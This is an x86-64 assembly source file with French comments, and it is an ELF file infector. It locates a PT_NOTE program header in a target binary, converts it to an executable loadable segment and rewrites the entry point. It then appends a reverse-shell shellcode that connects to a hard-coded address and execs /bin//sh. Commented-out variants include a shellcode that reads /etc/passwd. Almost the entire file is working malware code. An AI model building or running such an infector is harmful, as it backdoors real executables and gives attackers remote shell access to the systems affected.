section .data
    msg_error db "Erreur !", 0xa
    msg_error_len equ $ - msg_error



    entry_point db 0x48,0x3c ,0x00,0x0c,0x00, 0x00, 0x00, 0x00


    tp_load db 0x01
    offset_exagereted db 0x48,0x3c ,0x00,0x00
    droit_write_exe db 0x05

    vaddr_exagereted db 0x48,0x3c ,0x00,0x0c
    ;paddr_exagereted db 0x00,0x40 ,0x40,0x00

    taille_exagereted db 0x00 ,0x10 ,0x00,0x00

    p_align db 0x00, 0x00, 0x20


;3db0

    ;reverse_shell db 0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x97,0xb0,0x2a,0x48,0xb9,0xfe,0xff,0xee,0xa3,0x80,0xff,0xff,0xfe,0x48,0xf7,0xd9,0x51,0x54,0x5e,0xb2,0x10,0x0f,0x05,0x6a,0x03,0x5e,0xb0,0x21,0xff,0xce,0x0f,0x05,0x75,0xf8,0x99,0xb0,0x3b,0x52,0x48,0xb9,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x51,0x54,0x5f,0x0f,0x05


    ;reverse_shell db 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90
    ;read passwd
    ;reverse_shell db 0xeb,0x3f,0x5f,0x80,0x77,0x0b,0x41,0x48,0x31,0xc0,0x04,0x02,0x48,0x31,0xf6,0x0f,0x05,0x66,0x81,0xec,0xff,0x0f,0x48,0x8d,0x34,0x24,0x48,0x89,0xc7,0x48,0x31,0xd2,0x66,0xba,0xff,0x0f,0x48,0x31,0xc0,0x0f,0x05,0x48,0x31,0xff,0x40,0x80,0xc7,0x01,0x48,0x89,0xc2,0x48,0x31,0xc0,0x04,0x01,0x0f,0x05,0x48,0x31,0xc0,0x04,0x3c,0x0f,0x05,0xe8,0xbc,0xff,0xff,0xff,0x2f,0x65,0x74,0x63,0x2f,0x70,0x61,0x73,0x73,0x77,0x64,0x41


    reverse_shell db 0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x97,0xb0,0x2a,0x48,0xb9,0xfe,0xff,0xee,0xa3,0x80,0xff,0xff,0xfe,0x48,0xf7,0xd9,0x51,0x54,0x5e,0xb2,0x10,0x0f,0x05,0x6a,0x03,0x5e,0xb0,0x21,0xff,0xce,0x0f,0x05,0x75,0xf8,0x99,0xb0,0x3b,0x52,0x48,0xb9,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x51,0x54,0x5f,0x0f,0x05


    ;0xe9,0x401040

    nonope db 0x00


section .bss
    buffer resb 2000      ; Buffer pour stocker les données lues
    file_name resq 40
    size_file_name resq 1

    file_descriptor resq 1

    offset_tp resq 1

    taillfic resd 1


section .text
    global _start

_start:


    pop rax
    cmp rax, 2 ;; nb d'elem
    jne error

    ; on retire le nom du fichier executable
    pop rsi

    ; recuperation de l'argument 1
    pop rax
    mov [file_name], rax

    ; Ouverture du fichier en lecture ecriture 
    mov rax, 2
    mov rdi, [file_name]
    mov rsi, 2
    syscall

    ; verification des erreurs
    test rax, rax 
    js error


    ; Sauvegarde du descripteur de fichier
    mov [file_descriptor], rax



    ; Lecture du fichier
    mov rax, 0          
    mov rdi, [file_descriptor]
    mov rsi, buffer     
    mov rdx, 2000        
    syscall            

    mov rdi, 1              ; file descriptor 1 is stdout
    mov rax, 1              
    mov rsi, buffer       ; affichage du fic debug  
    syscall 



    ;init
    xor r9, r9
    mov r9, buffer
    xor rcx, rcx



;=== taille fichier 

; Utilisation de l'appel système lseek pour obtenir la taille du fichier
;    mov rdi, [file_descriptor]         ; Descripteur de fichier
;    mov rax, 8           ; Appel système pour lseek (8 pour lseek)
;    mov rsi, 0           ; Décalage à partir du début du fichier
;    mov rdx, 2           ; Origine du décalage (2 pour SEEK_END)
;    syscall              ; Appel système

    ; Gestion d'erreur si l'appel système lseek a échoué
;    cmp rax, -1
;    je error            ; Saute à l'étiquette erreur si rax est égal à -1

    ; La position actuelle (dans rax) est maintenant la taille du fichier
;    mov qword [taillfic], rax




mov r15, buffer


;a rendre dynamique plus tard
parse_phdr:
  xor rcx, rcx                       ; zero out rcx
  xor rdx, rdx                       ; zero out rdx
  mov cx, 12     ;  phnum
  mov rbx, 64    ; rbx contains the offset of the PHT
  mov dx,  56 ; rdx contains the size of an entry in the PHT

  loop_phdr:
    add rbx, rdx                   ; for every iteration, add size of a PHT entry
    dec rcx                        ; decrease phnum until we've iterated through 
    xor r13, r13      
    mov r13d , dword [r15 +rbx] ; all program headers or found a PT_NOTE segment
    cmp dword [r15 +rbx], 0x4  ; if 4, we have found a PT_NOTE segment, ; and head off to infect it
    je pt_note_found
    cmp rcx, 0
    jg loop_phdr


    jmp error 
  pt_note_found:

    mov [offset_tp], rbx

;    mov [offset_tp], rcx
    
    xor rcx,rcx

    xor rax, rax



;=============== entry point =================
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, 0x18     ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, entry_point   ; Nouvelles données à écrire
    mov rdx, 8 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   




; =============== PT NOte to PT LOAD =================
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]     ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    mov r10, 0          ; le déplacement à partir de l'offset spécifié
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, tp_load   ; Nouvelles données à écrire
    mov rdx, 1 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   

    
; =============== Changement droit  =================
xor rax, rax
 ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]  
    add rsi , 4   ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    mov r10, 0          ; le déplacement à partir de l'offset spécifié
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, droit_write_exe   ; Nouvelles données à écrire
    mov rdx, 1 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   



; =============== Address offset  =================
    xor rax, rax

    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]  
    add rsi , 8   ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    mov r10, 0          ; le déplacement à partir de l'offset spécifié
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, offset_exagereted   ; Nouvelles données à écrire
    mov rdx, 3 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   



; =============== Virtual address  =================
    xor rax, rax

    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]  
    add rsi , 16   ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, vaddr_exagereted   ; Nouvelles données à écrire
    mov rdx, 4 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   



; =============== physical address  =================
;    xor rax, rax

    ; Déplacer le curseur à l'offset spécifié
;    mov rax, 8          ; syscall number for lseek
;    mov rdi, [file_descriptor]; descripteur de fichier
;    mov rsi, [offset_tp]  
;    add rsi , 24   ; offset
;    mov rdx, 0          ; déplacement à partir du début du fichier
;    syscall       

;    xor rax, rax

;    mov rax, 1         
;    mov rdi, 3       ; Descripteur de fichier
;    mov rsi, paddr_exagereted   ; Nouvelles données à écrire
;    mov rdx, 3 ; Longueur des nouvelles données à écrire
;    syscall             ; Appel système   



; =============== Taille to exe  =================
    xor rax, rax

    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]  
    add rsi , 32   ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, taille_exagereted   ; Nouvelles données à écrire
    mov rdx, 3 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   



; =============== Taille to exe 2 =================
    xor rax, rax
    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]  
    add rsi , 40  ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, taille_exagereted   ; Nouvelles données à écrire
    mov rdx, 3 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   


; =============== p align =================
    xor rax, rax

    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]  
    add rsi , 48  ; offset
   mov rdx, 0          ; déplacement à partir du début du fichier
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, p_align   ; Nouvelles données à écrire
    mov rdx, 3 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   




; =============== Aggrandir le fichier  =================
;    xor r9, r9
;    size_up:

    ; Déplacer le curseur à l'offset spécifié
;    mov rax, 8          ; syscall number for lseek
;    mov rdi, [file_descriptor]; descripteur de fichier
;    mov rsi, 0 
;    mov rdx, 2         ; déplacement à partir du début du fichier
;    syscall  

    
;    mov rax, 1                   ; syscall number for write()
;    mov rdi, qword [file_descriptor] ; file descriptor
;    mov rsi, nonope     ; pointeur vers les données supplémentaires
;    mov rdx, 1 ; taille des données supplémentaires
;   syscall                      ; appel système pour écrire les données dans le fichier

;    inc r9
;    cmp r9, 0x4000
;    jg end_size_up

;    jmp size_up
;    end_size_up:



; =============== Ajout shell code  =================


    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, 0 
    mov rdx, 2         ; déplacement à partir du début du fichier
    syscall  


     xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, reverse_shell   ; Nouvelles données à écrire
    mov rdx, 0x41 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   



sortie:


        ;fermeture du fichier
    mov rax, 3          
    mov rdi, [file_descriptor]       
    syscall  



    ; Code de sortie
    mov rax, 60    
    mov rdi, 0    
    syscall     


error:
    mov rax, 1
    mov rdi, 1
    mov rsi, msg_error
    mov rdx, msg_error_len
    syscall

    mov rax, 60
    mov rdi, 1
    syscall
